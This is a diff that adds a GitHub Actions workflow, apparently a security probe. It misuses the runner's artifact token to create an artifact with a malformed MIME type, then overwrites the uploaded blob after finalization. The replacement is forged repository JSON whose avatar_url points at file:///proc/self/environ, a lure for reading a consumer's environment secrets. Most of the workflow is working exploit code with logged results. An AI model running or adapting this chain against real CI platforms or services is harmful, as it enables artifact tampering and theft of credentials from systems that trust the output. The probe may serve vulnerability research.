@@ -1,0 +1,128 @@
+name: Repo Cassette artifact probe 3
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe legacy version MIME and overwrite
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !resultsUrl) throw new Error('Runtime artifact credentials unavailable');
+
+            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+            const scope = payload.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
+            if (!scope) throw new Error('Actions.Results scope missing');
+            const [, runId, jobId] = scope.split(':');
+            const base = new URL(resultsUrl).origin;
+            const service = '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const repo = process.env.GITHUB_REPOSITORY;
+            const name = `probe-${process.env.GITHUB_RUN_ID}-${process.env.GITHUB_RUN_ATTEMPT}.json`;
+            const mime = 'application/json\u0085';
+            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
+
+            async function rpc(method, body) {
+              const response = await fetch(base + service + method, {
+                method: 'POST',
+                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify(body)
+              });
+              const data = await response.json().catch(() => ({}));
+              return {status: response.status, data};
+            }
+
+            const created = await rpc('CreateArtifact', {
+              ...ids, name, version: 4, mime_type: mime
+            });
+            if (created.status !== 200 || created.data.ok !== true) {
+              const reason = String(created.data.msg || created.data.code || '').slice(0, 160)
+                .replace(/https?:\/\/\S+/g, '[url]');
+              core.info(`CREATE_REJECTED status=${created.status} reason=${reason}`);
+              return;
+            }
+            core.info('CREATE_ACCEPTED version=4 mime=application/json+NEL');
+
+            const signedUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
+            if (!signedUrl) throw new Error('CreateArtifact returned no signed upload URL');
+            const sas = new URL(signedUrl);
+            core.info(`UPLOAD_SAS_PERMISSIONS=${sas.searchParams.get('sp') || 'unknown'}`);
+
+            async function putBlob(bytes) {
+              const response = await fetch(signedUrl, {
+                method: 'PUT',
+                headers: {
+                  'x-ms-blob-type': 'BlockBlob',
+                  'x-ms-blob-content-type': 'application/json',
+                  'x-ms-version': '2023-11-03',
+                  'Content-Type': 'application/octet-stream'
+                },
+                body: bytes
+              });
+              if (!response.ok) {
+                const code = response.headers.get('x-ms-error-code') || 'unknown';
+                throw new Error(`Azure PUT failed status=${response.status} code=${code}`);
+              }
+            }
+
+            const placeholder = Buffer.from('{}');
+            await putBlob(placeholder);
+            core.info('PLACEHOLDER_UPLOADED');
+            const finalized = await rpc('FinalizeArtifact', {
+              ...ids, name, size: String(placeholder.length)
+            });
+            if (finalized.status !== 200 || finalized.data.ok !== true) {
+              const code = String(finalized.data.code || finalized.data.msg || '').slice(0, 160)
+                .replace(/https?:\/\/\S+/g, '[url]');
+              throw new Error(`FinalizeArtifact failed status=${finalized.status} code=${code}`);
+            }
+            const artifactId = finalized.data.artifact_id || finalized.data.artifactId;
+            if (!/^\d+$/.test(String(artifactId))) throw new Error('FinalizeArtifact returned invalid ID');
+            core.info(`FINALIZED artifact_id=${artifactId}`);
+
+            const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
+            const document = {
+              full_name: repository,
+              owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
+              description: 'Repo Cassette artifact probe',
+              stargazers_count: 0
+            };
+            const finalBytes = Buffer.from(JSON.stringify(document));
+            await putBlob(finalBytes);
+            core.info(`OVERWRITE_ACCEPTED bytes=${finalBytes.length}`);
+
+            const api = `https://api.github.com/repos/${repository}`;
+            for (let attempt = 1; attempt <= 5; attempt++) {
+              const first = await fetch(api, {
+                headers: {
+                  'Accept': 'application/vnd.github.v3+json',
+                  'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
+                  'X-GitHub-Api-Version': '2022-11-28'
+                },
+                redirect: 'manual'
+              });
+              if (first.status === 302) {
+                const location = first.headers.get('location');
+                if (!location) throw new Error('Download redirect lacked Location');
+                const rsct = new URL(location).searchParams.get('rsct');
+                core.info(`REDIRECT_RSCT_UTF8_HEX=${rsct === null ? 'absent' : Buffer.from(rsct, 'utf8').toString('hex')}`);
+                const download = await fetch(location);
+                const body = Buffer.from(await download.arrayBuffer());
+                const type = download.headers.get('content-type') || '';
+                const typeHex = Buffer.from(type, 'latin1').toString('hex');
+                core.info(`DOWNLOAD status=${download.status} type_hex=${typeHex} body_matches=${body.equals(finalBytes)}`);
+                core.info(`REPOSITORY=${repository}`);
+                return;
+              }
+              if (attempt === 5) throw new Error(`GitHub download failed status=${first.status}`);
+              await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
